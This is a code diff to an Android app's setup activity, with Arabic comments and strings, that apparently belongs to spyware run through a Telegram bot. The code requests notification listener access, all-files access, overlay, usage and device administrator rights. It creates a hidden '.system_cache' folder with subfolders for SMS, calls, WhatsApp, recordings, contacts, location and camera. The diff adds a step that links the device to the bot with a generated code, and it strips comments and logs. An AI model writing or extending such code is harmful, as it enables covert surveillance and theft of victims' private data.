@@ -29,6 +29,7 @@ import androidx.core.content.ContextCompat;
 import com.alzahra.receiver.AdminReceiver;
 import com.alzahra.service.CoreService;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -41,7 +42,6 @@ public class MainActivity extends Activity {
     private TextView statusText;
     private ProgressBar progressBar;
     
-    // خطوات الإعداد
     private static final int STEP_PERMISSIONS = 0;
     private static final int STEP_NOTIFICATION = 1;
     private static final int STEP_STORAGE = 2;
@@ -49,7 +49,8 @@ public class MainActivity extends Activity {
     private static final int STEP_USAGE = 4;
     private static final int STEP_BATTERY = 5;
     private static final int STEP_ADMIN = 6;
-    private static final int STEP_DONE = 7;
+    private static final int STEP_LINK = 7;
+    private static final int STEP_DONE = 8;
     
     private int currentStep = 0;
 
@@ -57,7 +58,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // إنشاء واجهة بسيطة
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(android.view.Gravity.CENTER);
@@ -84,7 +84,6 @@ public class MainActivity extends Activity {
         prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
         handler = new Handler(Looper.getMainLooper());
         
-        // التحقق من الإعداد السابق
         if (prefs.getBoolean("fully_configured", false)) {
             startServiceAndFinish();
             return;
@@ -101,32 +100,36 @@ public class MainActivity extends Activity {
     private void runSetupStep() {
         switch (currentStep) {
             case STEP_PERMISSIONS:
-                updateStatus("الخطوة 1/7: طلب الصلاحيات الأساسية...");
+                updateStatus("الخطوة 1/8: طلب الصلاحيات الأساسية...");
                 requestAllPermissions();
                 break;
             case STEP_NOTIFICATION:
-                updateStatus("الخطوة 2/7: الوصول للإشعارات...");
+                updateStatus("الخطوة 2/8: الوصول للإشعارات...");
                 requestNotificationAccess();
                 break;
             case STEP_STORAGE:
-                updateStatus("الخطوة 3/7: الوصول لجميع الملفات...");
+                updateStatus("الخطوة 3/8: الوصول لجميع الملفات...");
                 requestStorageAccess();
                 break;
             case STEP_OVERLAY:
-                updateStatus("الخطوة 4/7: الظهور فوق التطبيقات...");
+                updateStatus("الخطوة 4/8: الظهور فوق التطبيقات...");
                 requestOverlayPermission();
                 break;
             case STEP_USAGE:
-                updateStatus("الخطوة 5/7: الوصول للاستخدام...");
+                updateStatus("الخطوة 5/8: الوصول للاستخدام...");
                 requestUsageAccess();
                 break;
             case STEP_BATTERY:
-                updateStatus("الخطوة 6/7: تجاهل تحسين البطارية...");
+                updateStatus("الخطوة 6/8: تجاهل تحسين البطارية...");
                 requestBatteryOptimization();
                 break;
             case STEP_ADMIN:
-                updateStatus("الخطوة 7/7: تفعيل مسؤول الجهاز...");
+                updateStatus("الخطوة 7/8: تفعيل مسؤول الجهاز...");
                 requestDeviceAdmin();
+                break;
+            case STEP_LINK:
+                updateStatus("الخطوة 8/8: ربط الجهاز...");
+                showLinkScreen();
                 break;
             case STEP_DONE:
                 completeSetup();
@@ -145,10 +148,6 @@ public class MainActivity extends Activity {
     private void requestAllPermissions() {
         List<String> permissions = new ArrayList<>();
         
-        // صلاحيات ثابتة (لا تحتاج طلب runtime)
-        // INTERNET, ACCESS_NETWORK_STATE, WAKE_LOCK, VIBRATE, etc.
-        
-        // صلاحيات تحتاج طلب runtime
         String[] runtimePerms;
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -217,10 +216,8 @@ public class MainActivity extends Activity {
         }
         
         if (permissions.isEmpty()) {
-            Log.d(TAG, "All runtime permissions already granted");
             nextStep();
         } else {
-            Log.d(TAG, "Requesting " + permissions.size() + " permissions");
             ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
     }
@@ -229,7 +226,6 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // طباعة النتائج للتصحيح
             for (int i = 0; i < permissions.length; i++) {
                 Log.d(TAG, "Permission: " + permissions[i] + " = " + (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
             }
@@ -250,8 +246,7 @@ public class MainActivity extends Activity {
             "يرجى تفعيل 'Al-Zahra' في قائمة الوصول للإشعارات",
             () -> {
                 try {
-                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-                    startActivityForResult(intent, 2001);
+                    startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
                 } catch (Exception e) {
                     nextStep();
                 }
@@ -259,9 +254,8 @@ public class MainActivity extends Activity {
     }
     
     private boolean isNotificationServiceEnabled() {
-        String pkgName = getPackageName();
         String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
-        return flat != null && flat.contains(pkgName);
+        return flat != null && flat.contains(getPackageName());
     }
     
     // ═══════════════════════════════════════════
@@ -310,9 +304,8 @@ public class MainActivity extends Activity {
                 "يرجى السماح بالظهور فوق التطبيقات الأخرى",
                 () -> {
                     try {
-                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                            Uri.parse("package:" + getPackageName()));
-                        startActivityForResult(intent, 2003);
+                        startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:" + getPackageName())), 2003);
                     } catch (Exception e) {
                         nextStep();
                     }
@@ -409,27 +402,105 @@ public class MainActivity extends Activity {
     }
     
     // ═══════════════════════════════════════════
+    // الخطوة 8: شاشة الربط
+    // ═══════════════════════════════════════════
+    private void showLinkScreen() {
+        runOnUiThread(() -> {
+            LinearLayout layout = new LinearLayout(this);
+            layout.setOrientation(LinearLayout.VERTICAL);
+            layout.setGravity(android.view.Gravity.CENTER);
+            layout.setPadding(48, 48, 48, 48);
+            layout.setBackgroundColor(0xFF1B5E20);
+            
+            TextView title = new TextView(this);
+            title.setText("🔗 ربط الجهاز بالبوت");
+            title.setTextColor(0xFFFFFFFF);
+            title.setTextSize(22);
+            title.setPadding(0, 0, 0, 24);
+            layout.addView(title);
+            
+            TextView info = new TextView(this);
+            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link\n3. أدخل الكود الذي يظهر لك");
+            info.setTextColor(0xFFBBBBBB);
+            info.setTextSize(16);
+            info.setPadding(0, 0, 0, 32);
+            layout.addView(info);
+            
+            // توليد كود الجهاز
+            String deviceCode = generateDeviceCode();
+            prefs.edit().putString("device_code", deviceCode).apply();
+            
+            TextView codeLabel = new TextView(this);
+            codeLabel.setText("كود الربط الخاص بك:");
+            codeLabel.setTextColor(0xFFAAAAAA);
+            codeLabel.setTextSize(14);
+            layout.addView(codeLabel);
+            
+            TextView codeView = new TextView(this);
+            codeView.setText(deviceCode);
+            codeView.setTextColor(0xFF4CAF50);
+            codeView.setTextSize(36);
+            codeView.setTypeface(android.graphics.Typeface.MONOSPACE);
+            codeView.setPadding(0, 16, 0, 32);
+            layout.addView(codeView);
+            
+            // زر التحقق
+            android.widget.Button verifyBtn = new android.widget.Button(this);
+            verifyBtn.setText("✅ تم الربط - متابعة");
+            verifyBtn.setTextSize(16);
+            verifyBtn.setPadding(32, 16, 32, 16);
+            verifyBtn.setOnClickListener(v -> {
+                // التحقق من الربط
+                checkLinkStatus();
+            });
+            layout.addView(verifyBtn);
+            
+            setContentView(layout);
+        });
+    }
+    
+    private String generateDeviceCode() {
+        // توليد كود من 9 أرقام
+        StringBuilder code = new StringBuilder();
+        for (int i = 0; i < 9; i++) {
+            code.append((int)(Math.random() * 10));
+        }
+        return code.toString();
+    }
+    
+    private void checkLinkStatus() {
+        // التحقق من أن الجهاز مرتبط
+        if (prefs.getBoolean("device_linked", false)) {
+            nextStep();
+        } else {
+            // إظهار رسالة انتظار
+            new AlertDialog.Builder(this)
+                .setTitle("في انتظار الربط")
+                .setMessage("تأكد من إدخال الكود في البوت")
+                .setPositiveButton("إعادة المحاولة", (d, w) -> checkLinkStatus())
+                .setNegativeButton("تخطي", (d, w) -> nextStep())
+                .show();
+        }
+    }
+    
+    // ═══════════════════════════════════════════
     // إكمال الإعداد
     // ═══════════════════════════════════════════
     private void completeSetup() {
         updateStatus("✅ تم الإعداد بنجاح!");
         
-        // حفظ حالة الإعداد
         prefs.edit()
             .putBoolean("fully_configured", true)
             .putLong("setup_time", System.currentTimeMillis())
             .apply();
         
-        // إنشاء المجلد السري
         createSecretFolder();
         
-        // تشغيل الخدمة
         handler.postDelayed(this::startServiceAndFinish, 1500);
     }
     
     private void createSecretFolder() {
         try {
-            // إنشاء مجلد سري مخفي
             File secretDir;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 secretDir = new File(getExternalFilesDir(null), ".system_cache");
@@ -441,7 +512,6 @@ public class MainActivity extends Activity {
                 secretDir.mkdirs();
             }
             
-            // إنشاء المجلدات الفرعية
             String[] subDirs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
             for (String dir : subDirs) {
                 File subDir = new File(secretDir, dir);
@@ -450,13 +520,11 @@ public class MainActivity extends Activity {
                 }
             }
             
-            // إخفاء المجلد
             File nomedia = new File(secretDir, ".nomedia");
             if (!nomedia.exists()) {
                 nomedia.createNewFile();
             }
             
-            // حفظ مسار المجلد
             prefs.edit().putString("secret_path", secretDir.getAbsolutePath()).apply();
             
             Log.d(TAG, "Secret folder created: " + secretDir.getAbsolutePath());
@@ -481,9 +549,6 @@ public class MainActivity extends Activity {
         finishAffinity();
     }
     
-    // ═══════════════════════════════════════════
-    // حوار مساعد
-    // ═══════════════════════════════════════════
     private void showDialog(String title, String message, Runnable onConfirm) {
         new AlertDialog.Builder(this)
             .setTitle(title)
@@ -497,7 +562,6 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        Log.d(TAG, "onActivityResult: " + requestCode);
         nextStep();
     }
     
